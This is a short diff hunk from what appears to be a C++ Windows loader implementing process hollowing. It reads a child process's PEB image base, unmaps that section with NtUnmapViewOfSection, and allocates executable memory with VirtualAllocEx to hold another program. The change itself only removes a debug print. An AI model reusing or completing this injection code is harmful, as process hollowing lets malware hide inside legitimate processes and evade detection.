@@ -188,7 +188,6 @@ int main() {
     NTSTATUS stat = fNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &info, sizeof(info), NULL);
    // DWORD64 susProImageBase = *(DWORD64*)((DWORD64)info.PebBaseAddress + 0X10);
     ReadProcessMemory(pi.hProcess, LPCVOID((DWORD64)info.PebBaseAddress + 0X10), &susProImageBase, 8,NULL);
-    printf("0x:%x\n", susProImageBase);
     NTSTATUS status = fNtUnmapViewOfSection(pi.hProcess, (PVOID)susProImageBase);
     // Use API "VirtualAllocEx" to allocate memory for the stretched program1.exe
     DWORD64 realImage_exe1 = (DWORD64)VirtualAllocEx(pi.hProcess, (LPVOID)imageBase_exe1, imageSize_exe1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
